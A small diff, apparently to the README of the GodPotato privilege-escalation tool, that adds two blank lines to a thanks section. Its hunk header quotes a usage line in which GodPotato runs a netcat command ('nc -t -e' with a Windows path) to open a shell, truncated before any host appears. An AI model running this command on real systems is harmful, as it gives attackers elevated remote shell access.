@@ -78,6 +78,8 @@ GodPotato -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "nc -t -e C:\Window
 # Thanks
 
 zcgonvh
+
+
 skay
 
 
